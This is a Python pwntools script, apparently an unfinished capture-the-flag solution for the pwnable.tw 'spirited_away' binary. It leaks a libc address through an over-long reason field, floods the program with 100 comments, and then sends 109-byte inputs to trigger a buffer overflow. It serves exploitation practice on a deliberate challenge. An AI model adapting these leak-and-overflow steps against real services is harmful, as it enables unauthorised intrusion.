from pwn import *

BEDUG=True

if BEDUG==True:
    io = process('./spirited_away')
else:
    io = remote('chall.pwnable.tw', 10204)

#io = process('./spirited_away', env={"LD_PRELOAD":"./libc_32.so.6"})
libc = ELF('/lib/i386-linux-gnu/libc.so.6')


def new_comment(name, age, reason, comment, choice = b'y'):
    print(io.recvuntil(b'Please enter your name: '))
    io.sendline(name)
    print(io.recvuntil(b'Please enter your age: '))
    io.sendline(str(age).encode('utf-8'))
    print(io.recvuntil(b'Why did you came to see this movie? '))
    io.sendline(reason)
    print(io.recvuntil(b'Please enter your comment: '))
    io.sendline(comment)
    print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
    io.sendline(choice)


print(io.recvuntil(b'Please enter your name: '))
io.sendline(b'A')
print(io.recvuntil(b'Please enter your age: '))
io.sendline(b'1')
print(io.recvuntil(b'Why did you came to see this movie? '))
io.sendline(b'A'*19)
print(io.recvuntil(b'Please enter your comment: '))
io.sendline(b'A')
print(io.recvuntil(b'Reason: '))
print(io.recv(20))
libc.address = u32(io.recv(4)) - 0x5fe0b
print(hex(libc.address))
print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
io.sendline(b'y')

for i in range(100):
    new_comment(b'A', b'1', b'A', b'A')

# overwritten = 0x6e = 110

print(io.recvuntil(b'Please enter your name: '))
io.sendline(b'A'*109)
print(io.recvuntil(b'Please enter your age: '))
io.sendline(b'1')
print(io.recvuntil(b'Why did you came to see this movie? '))
io.sendline(b'A')
print(io.recvuntil(b'Please enter your comment: '))
io.sendline(b'A'*109)
print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
io.sendline(b'n')
print(io.recv())